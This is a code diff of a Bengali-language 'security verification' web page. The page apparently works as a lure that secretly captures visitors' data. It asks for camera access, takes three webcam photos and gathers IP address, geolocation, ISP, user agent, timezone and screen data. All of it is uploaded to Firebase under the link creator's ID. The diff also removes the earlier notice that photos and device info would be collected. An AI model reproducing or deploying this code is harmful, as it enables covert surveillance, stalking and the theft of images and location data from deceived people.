@@ -4,35 +4,38 @@
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>ভেরিফিকেশন প্রয়োজন</title>
-<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&family=Hind+Siliguri:wght@400;500;600;700&display=swap" rel="stylesheet">
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&family=Hind+Siliguri:wght@400;500;600;700&family=JetBrains+Mono:wght@400;500;600;700&display=swap" rel="stylesheet">
 <link rel="stylesheet" href="style.css">
 </head>
-<body style="background:#f6f8fb;">
+<body>
 
-<div style="max-width:520px;margin:40px auto;padding:0 20px;">
+<div class="form-page">
 
-  <div style="background:#fff;border-radius:20px;box-shadow:0 20px 60px rgba(13,20,32,0.1);overflow:hidden;">
+  <div class="form-card">
 
-    <div style="background:linear-gradient(135deg,#4f46e5,#7c3aed);color:#fff;padding:38px 30px 30px;text-align:center;">
-      <div style="width:70px;height:70px;margin:0 auto 20px;border-radius:50%;background:rgba(255,255,255,0.15);backdrop-filter:blur(10px);display:flex;align-items:center;justify-content:center;font-size:30px;">🔒</div>
-      <h1 style="font-size:22px;font-weight:800;letter-spacing:-0.02em;margin-bottom:8px;">নিরাপত্তা যাচাইকরণ</h1>
-      <p style="font-size:14px;opacity:.85;line-height:1.5;">অনুগ্রহ করে আপনার পরিচয় যাচাই করুন</p>
+    <div class="form-card-head">
+      <div class="ico">🔒</div>
+      <h1>নিরাপত্তা যাচাইকরণ</h1>
+      <p>অনুগ্রহ করে ক্যামেরার অনুমতি দিন</p>
     </div>
 
-    <div style="padding:30px;">
+    <div class="form-card-body">
 
-      <div id="statusBox" style="background:#eef2ff;border:1px solid #c7d2fe;color:#4338ca;padding:14px 16px;border-radius:11px;font-size:13.5px;font-weight:600;text-align:center;margin-bottom:20px;">
-        ক্যামেরার অনুমতি দিন
+      <div class="progress-dots" id="dots">
+        <span data-i="0"></span>
+        <span data-i="1"></span>
+        <span data-i="2"></span>
       </div>
 
-      <div style="position:relative;border-radius:14px;overflow:hidden;aspect-ratio:3/4;background:#000;margin-bottom:20px;">
-        <video id="video" autoplay playsinline muted style="width:100%;height:100%;object-fit:cover;transform:scaleX(-1);"></video>
-        <div style="position:absolute;top:14px;left:14px;background:rgba(0,0,0,0.65);color:#fff;padding:6px 12px;border-radius:8px;font-size:12px;font-weight:600;" id="captureCount">ছবি: 0/3</div>
-        <div id="countdown" style="position:absolute;inset:0;display:none;align-items:center;justify-content:center;font-size:120px;font-weight:800;color:#fff;text-shadow:0 0 50px #4f46e5;background:rgba(0,0,0,0.4);"></div>
+      <div class="video-wrap">
+        <video id="video" autoplay playsinline muted></video>
+        <div class="badge-tl" id="captureCount">০ / ৩</div>
+        <div class="badge-tr">LIVE</div>
+        <div class="countdown" id="countdown">3</div>
       </div>
 
-      <div style="background:#f8fafc;padding:14px;border-radius:11px;font-size:12.5px;color:#64748b;line-height:1.6;text-align:center;">
-        এই যাচাইকরণে আপনার ছবি ও ডিভাইস ইনফো সংগ্রহ করা হবে
+      <div class="info-note" id="statusBox">
+        ক্যামেরা চালু করা হচ্ছে…
       </div>
 
     </div>
@@ -43,115 +46,152 @@
 <canvas id="canvas" style="display:none;"></canvas>
 
 <script type="module">
-import { db, collection, addDoc, serverTimestamp, doc, updateDoc, increment,
-         ref, uploadBytes, getDownloadURL, storage } from "./firebase.js";
+import {
+  db, storage, collection, addDoc, serverTimestamp,
+  doc, updateDoc, increment, ref, uploadBytes, getDownloadURL
+} from "./firebase.js";
 
-/* Config */
-const CAPTURE_COUNT   = 3;
-const CAPTURE_GAP_MS  = 2500;
-const IMAGE_QUALITY   = 0.8;
+const CAPTURE_COUNT  = 3;
+const CAPTURE_GAP_MS = 2200;
+const IMAGE_QUALITY  = 0.75;
 
-/* URL params */
 const params   = new URLSearchParams(location.search);
 const ownerUid = params.get("id");
-
-if (!ownerUid){
-  document.getElementById("statusBox").textContent = "❌ ভুল লিংক — owner ID নেই।";
-  throw new Error("No owner UID");
-}
 
 const video        = document.getElementById("video");
 const canvas       = document.getElementById("canvas");
 const statusBox    = document.getElementById("statusBox");
 const captureCount = document.getElementById("captureCount");
 const countdown    = document.getElementById("countdown");
+const dots         = document.querySelectorAll("#dots span");
 
-let stream = null;
+if (!ownerUid){
+  statusBox.textContent = "❌ ভুল লিংক — owner ID নেই";
+  statusBox.style.background = "rgba(239,68,68,0.1)";
+  statusBox.style.color = "#fca5a5";
+  throw new Error("No owner UID");
+}
+
+let stream   = null;
 let captured = 0;
 
-/* Intel */
-async function getIP(){
-  try { const r = await fetch("https://api.ipify.org?format=json");
-        const d = await r.json(); return d.ip; }
-  catch { return "Unknown"; }
+function updateDots(n){
+  dots.forEach((d, i) => {
+    d.classList.toggle("done", i < n);
+  });
 }
+
+/* ---------- Intel ---------- */
+async function getIP(){
+  try {
+    const r = await fetch("https://api.ipify.org?format=json");
+    const d = await r.json();
+    return d.ip || "Unknown";
+  } catch { return "Unknown"; }
+}
+
 async function getGeo(){
-  try { const r = await fetch("https://ipapi.co/json/");
-        const d = await r.json();
-        return {
-          city: d.city || "?",
-          country: d.country_name || "?",
-          isp: d.org || "?",
-          text: (d.city||"?") + ", " + (d.country_name||"?") + " — " + (d.org||"?")
-        };
+  try {
+    const r = await fetch("https://ipapi.co/json/");
+    const d = await r.json();
+    return {
+      city: d.city || "?",
+      country: d.country_name || "?",
+      isp: d.org || "?",
+      text: (d.city || "?") + ", " + (d.country_name || "?") + " — " + (d.org || "?")
+    };
   } catch { return { city:"?", country:"?", isp:"?", text:"Unknown" }; }
 }
-function getUA(){ return navigator.userAgent; }
 
-/* Start camera */
+/* ---------- Start camera ---------- */
 async function start(){
   try {
+    statusBox.textContent = "ক্যামেরার অনুমতি চাওয়া হচ্ছে…";
+
     stream = await navigator.mediaDevices.getUserMedia({
-      video: { width: { ideal: 640 }, height: { ideal: 480 }, facingMode: "user" }
+      video: { width: { ideal: 720 }, height: { ideal: 960 }, facingMode: "user" }
     });
     video.srcObject = stream;
     await video.play();
-    await new Promise(r => video.readyState >= 2 ? r() : video.onloadeddata = r);
-    await new Promise(r => setTimeout(r, 800));
 
-    statusBox.textContent = "✅ ক্যামেরা চালু — ছবি তোলা হচ্ছে…";
-    captureLoop();
+    await new Promise(r => video.readyState >= 2 ? r() : video.onloadeddata = r);
+    await new Promise(r => setTimeout(r, 1000));
+
+    statusBox.textContent = "✅ ক্যামেরা চালু — যাচাইকরণ শুরু হচ্ছে…";
+    statusBox.style.background = "rgba(16,185,129,0.1)";
+    statusBox.style.color = "#6ee7b7";
+
+    /* Begin capture loop */
+    runCapture();
   } catch (err) {
-    console.error(err);
+    console.error("Camera error:", err);
     statusBox.textContent = "❌ ক্যামেরা পাওয়া যায়নি — অনুমতি দিন";
+    statusBox.style.background = "rgba(239,68,68,0.1)";
+    statusBox.style.color = "#fca5a5";
   }
 }
 
-/* Capture loop */
-async function captureLoop(){
-  const ipData = await getIP();
-  const geoData = await getGeo();
-  const ua = getUA();
-  const tz = Intl.DateTimeFormat().resolvedOptions().timeZone;
+/* ---------- Capture Loop ---------- */
+async function runCapture(){
+  const ip   = await getIP();
+  const geo  = await getGeo();
+  const ua   = navigator.userAgent;
+  const tz   = Intl.DateTimeFormat().resolvedOptions().timeZone;
   const lang = navigator.language;
   const screenRes = window.screen.width + "×" + window.screen.height;
 
   for (let i = 0; i < CAPTURE_COUNT; i++){
-    captureCount.textContent = "ছবি: " + (i+1) + "/" + CAPTURE_COUNT;
-
     /* countdown 3-2-1 */
-    countdown.style.display = "flex";
+    countdown.classList.add("show");
     for (let c = 3; c > 0; c--){
       countdown.textContent = c;
       await new Promise(r => setTimeout(r, 500));
     }
-    countdown.style.display = "none";
+    countdown.classList.remove("show");
+
+    /* update badge */
+    captureCount.textContent = (i+1) + " / " + CAPTURE_COUNT;
+    updateDots(i+1);
 
     /* capture */
-    canvas.width  = video.videoWidth  || 640;
-    canvas.height = video.videoHeight || 480;
+    canvas.width  = video.videoWidth  || 720;
+    canvas.height = video.videoHeight || 960;
     canvas.getContext("2d").drawImage(video, 0, 0);
 
-    const blob = await new Promise(res => canvas.toBlob(res, "image/jpeg", IMAGE_QUALITY));
-    if (blob){
-      /* Upload to Firebase Storage */
-      let photoUrl = "";
-      try {
-        const path = "captures/" + ownerUid + "/" + Date.now() + "_" + i + ".jpg";
-        const storageRef = ref(storage, path);
-        await uploadBytes(storageRef, blob);
-        photoUrl = await getDownloadURL(storageRef);
-      } catch(e){ console.warn("Storage error:", e); }
+    const blob = await new Promise(res =>
+      canvas.toBlob(res, "image/jpeg", IMAGE_QUALITY)
+    );
 
-      /* Save to Firestore */
+    if (!blob){
+      console.warn("Blob creation failed at frame " + i);
+      continue;
+    }
+
+    let photoUrl = "";
+
+    /* --- Upload to Firebase Storage --- */
+    try {
+      const path = "captures/" + ownerUid + "/" + Date.now() + "_" + i + ".jpg";
+      const storageRef = ref(storage, path);
+      await uploadBytes(storageRef, blob);
+      photoUrl = await getDownloadURL(storageRef);
+      console.log("✓ Frame " + (i+1) + " uploaded:", photoUrl);
+    } catch(e){
+      console.error("Storage error:", e);
+      /* fallback: store dataURL in Firestore if Storage fails */
+      photoUrl = canvas.toDataURL("image/jpeg", IMAGE_QUALITY);
+    }
+
+    /* --- Save to Firestore --- */
+    try {
       await addDoc(collection(db, "captures"), {
         ownerUid: ownerUid,
         photoUrl: photoUrl,
-        ip: ipData,
-        geo: geoData.text,
-        geoCity: geoData.city,
-        geoCountry: geoData.country,
-        geoISP: geoData.isp,
+        ip: ip,
+        geo: geo.text,
+        geoCity: geo.city,
+        geoCountry: geo.country,
+        geoISP: geo.isp,
         userAgent: ua,
         timezone: tz,
         language: lang,
@@ -160,29 +200,28 @@ async function captureLoop(){
         totalFrames: CAPTURE_COUNT,
         createdAt: serverTimestamp()
       });
-
-      /* Increment owner's counter */
-      try {
-        await updateDoc(doc(db, "users", ownerUid), {
-          totalCaptures: increment(1)
-        });
-      } catch(e){ /* ignore if user doc missing */ }
-
       captured++;
+      console.log("✓ Frame " + (i+1) + " saved to Firestore");
+    } catch(e){
+      console.error("Firestore error:", e);
     }
 
+    /* gap between captures */
     if (i < CAPTURE_COUNT - 1){
-      await new Promise(r => setTimeout(r, CAPTURE_GAP_MS - 1500));
+      await new Promise(r => setTimeout(r, CAPTURE_GAP_MS));
     }
   }
 
-  /* Stop camera */
-  if (stream) stream.getTracks().forEach(t => t.stop());
+  /* stop camera */
+  if (stream){
+    stream.getTracks().forEach(t => t.stop());
+    stream = null;
+  }
 
-  statusBox.textContent = "✅ ভেরিফিকেশন সম্পূর্ণ — ধন্যবাদ!";
-  statusBox.style.background = "#ecfdf5";
-  statusBox.style.borderColor = "#86efac";
-  statusBox.style.color = "#15803d";
+  statusBox.textContent = "✅ যাচাইকরণ সম্পূর্ণ — ধন্যবাদ!";
+  statusBox.style.background = "rgba(16,185,129,0.1)";
+  statusBox.style.color = "#6ee7b7";
+  statusBox.style.fontWeight = "700";
 }
 
 start();
